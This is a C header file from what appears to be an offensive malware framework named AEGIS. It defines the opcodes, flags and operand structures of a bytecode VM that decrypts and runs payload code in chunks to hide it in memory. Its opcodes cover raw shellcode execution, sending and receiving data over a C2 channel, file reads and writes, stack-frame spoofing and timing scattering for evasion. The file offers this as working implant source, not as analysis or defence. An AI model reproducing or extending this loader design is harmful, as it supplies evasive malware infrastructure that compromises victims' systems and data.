/*
 * ============================================================================
 *  AEGIS FRAMEWORK — Nanomachine Opcodes
 * ============================================================================
 *  Classification : PRIVATE — LO/ENI EYES ONLY
 *  Component      : nanomachine/opcodes.h
 *  Purpose        : Opcode definitions for the Nanomachine custom bytecode VM.
 *                   The Nanomachine is a minimalist execution engine that
 *                   decrypts and runs payload code chunk-by-chunk, never
 *                   exposing the full payload in executable memory.
 *
 *  Instruction Format:
 *  ┌──────────┬──────────┬──────────┬───────────────────────┐
 *  │ Op (2B)  │ Flags(1B)│ Len (4B) │ Operand (variable)    │
 *  └──────────┴──────────┴──────────┴───────────────────────┘
 *
 *  Total header: 7 bytes.  Max operand: AEGIS_NANO_MAX_CHUNK_SIZE.
 * ============================================================================
 */

#ifndef AEGIS_OPCODES_H
#define AEGIS_OPCODES_H

#include "../common/types.h"

/* ── Opcode Definitions ──────────────────────────────────────────────────── */

typedef enum {
  /* Control Flow */
  OP_NOP = 0x0000,   /* No operation (timing padding)           */
  OP_HALT = 0x0001,  /* Stop execution                          */
  OP_YIELD = 0x0002, /* Yield CPU (temporal scattering)         */
  OP_JUMP = 0x0003,  /* Jump to vault offset (operand: uint64)  */
  OP_CALL = 0x0004,  /* Push return addr, jump to offset        */
  OP_RET = 0x0005,   /* Pop return addr, jump back              */

  /* Execution */
  OP_EXEC_CHUNK = 0x0010,  /* Decrypt, execute chunk, wipe            */
  OP_EXEC_NATIVE = 0x0011, /* Execute raw shellcode from operand      */
  OP_EXEC_FUNC = 0x0012,   /* Call a resolved function by address     */

  /* Memory */
  OP_ALLOC = 0x0020, /* Allocate memory (operand: size)         */
  OP_FREE = 0x0021,  /* Free allocated memory                   */
  OP_COPY = 0x0022,  /* memcpy between regions                  */
  OP_WIPE = 0x0023,  /* Secure wipe a region                    */

  /* Crypto */
  OP_DECRYPT = 0x0030, /* Decrypt a vault chunk to exec buffer    */
  OP_REKEY = 0x0031,   /* Rotate the session key                  */
  OP_HASH = 0x0032,    /* SHA-256 hash a region                   */

  /* I/O (via the host process) */
  OP_NET_SEND = 0x0040,   /* Send data via C2 channel                */
  OP_NET_RECV = 0x0041,   /* Receive data from C2                    */
  OP_FILE_READ = 0x0042,  /* Read a file into memory                 */
  OP_FILE_WRITE = 0x0043, /* Write memory to a file                  */

  /* Stealth */
  OP_SPOOF_STACK = 0x0050, /* Enable stack frame spoofing             */
  OP_UNSPOOF = 0x0051,     /* Disable stack spoofing                  */
  OP_SCATTER_ON = 0x0052,  /* Enable temporal scattering              */
  OP_SCATTER_OFF = 0x0053, /* Disable temporal scattering             */

  /* IPC */
  OP_IPC_SEND = 0x0060, /* Send IPC message to Alpha/Beta          */
  OP_IPC_RECV = 0x0061, /* Receive IPC message                     */

  /* Diagnostics */
  OP_LOG = 0x00F0,        /* Write a log entry                       */
  OP_CHECKPOINT = 0x00F1, /* Save execution state for resume         */
} aegis_opcode_t;

/* ── Instruction Flags ───────────────────────────────────────────────────── */

#define OP_FLAG_NONE 0x00
#define OP_FLAG_ENCRYPTED 0x01 /* Operand data is AES-encrypted          */
#define OP_FLAG_COMPRESS 0x02  /* Operand data is compressed (future)    */
#define OP_FLAG_LAST 0x04      /* Last instruction in a sequence         */
#define OP_FLAG_CRITICAL 0x08  /* Wipe immediately after execution       */
#define OP_FLAG_TIMED 0x10     /* Enforce minimum execution time         */

/* ── Instruction Header ─────────────────────────────────────────────────── */

typedef struct {
  uint16_t opcode;      /* aegis_opcode_t                          */
  uint8_t flags;        /* OP_FLAG_* bitmask                       */
  uint32_t operand_len; /* Length of following operand data         */
} AEGIS_PACKED aegis_instruction_t;

AEGIS_STATIC_ASSERT(sizeof(aegis_instruction_t) == 7,
                    "Instruction header must be 7 bytes");

/* ── Operand Structures (for instructions that need structured data) ─────── */

/* OP_JUMP, OP_CALL operand */
typedef struct {
  uint64_t target_offset; /* Byte offset into the vault              */
} AEGIS_PACKED op_jump_t;

/* OP_EXEC_FUNC operand */
typedef struct {
  uint64_t func_addr; /* Absolute address of the function        */
  uint32_t arg_count; /* Number of arguments                     */
  uint64_t args[6];   /* Up to 6 arguments (register convention) */
} AEGIS_PACKED op_exec_func_t;

/* OP_ALLOC operand */
typedef struct {
  uint32_t size;      /* Allocation size                         */
  uint8_t protection; /* mmap protection flags (encoded)         */
  uint8_t slot_id;    /* Internal slot for tracking              */
} AEGIS_PACKED op_alloc_t;

/* OP_COPY operand */
typedef struct {
  uint8_t src_slot; /* Source memory slot                      */
  uint8_t dst_slot; /* Destination memory slot                 */
  uint32_t offset;  /* Source offset                           */
  uint32_t length;  /* Bytes to copy                           */
} AEGIS_PACKED op_copy_t;

/* OP_NET_SEND operand */
typedef struct {
  uint32_t data_len;
  uint8_t channel; /* C2 channel type                         */
  uint8_t data[];  /* Variable-length data                    */
} AEGIS_PACKED op_net_send_t;

/* OP_LOG operand */
typedef struct {
  uint8_t severity;  /* Log severity                            */
  char message[256]; /* Log message text                        */
} AEGIS_PACKED op_log_t;

/* ── Helper Macros ───────────────────────────────────────────────────────── */

#define INSTRUCTION_SIZE(instr)                                                \
  (sizeof(aegis_instruction_t) + (instr)->operand_len)

/* Opcode name string for logging */
static inline const char *opcode_name(uint16_t op) {
  switch (op) {
  case OP_NOP:
    return "NOP";
  case OP_HALT:
    return "HALT";
  case OP_YIELD:
    return "YIELD";
  case OP_JUMP:
    return "JUMP";
  case OP_CALL:
    return "CALL";
  case OP_RET:
    return "RET";
  case OP_EXEC_CHUNK:
    return "EXEC_CHUNK";
  case OP_EXEC_NATIVE:
    return "EXEC_NATIVE";
  case OP_EXEC_FUNC:
    return "EXEC_FUNC";
  case OP_ALLOC:
    return "ALLOC";
  case OP_FREE:
    return "FREE";
  case OP_COPY:
    return "COPY";
  case OP_WIPE:
    return "WIPE";
  case OP_DECRYPT:
    return "DECRYPT";
  case OP_REKEY:
    return "REKEY";
  case OP_HASH:
    return "HASH";
  case OP_NET_SEND:
    return "NET_SEND";
  case OP_NET_RECV:
    return "NET_RECV";
  case OP_FILE_READ:
    return "FILE_READ";
  case OP_FILE_WRITE:
    return "FILE_WRITE";
  case OP_SPOOF_STACK:
    return "SPOOF_STACK";
  case OP_UNSPOOF:
    return "UNSPOOF";
  case OP_SCATTER_ON:
    return "SCATTER_ON";
  case OP_SCATTER_OFF:
    return "SCATTER_OFF";
  case OP_IPC_SEND:
    return "IPC_SEND";
  case OP_IPC_RECV:
    return "IPC_RECV";
  case OP_LOG:
    return "LOG";
  case OP_CHECKPOINT:
    return "CHECKPOINT";
  default:
    return "UNKNOWN";
  }
}

#endif /* AEGIS_OPCODES_H */
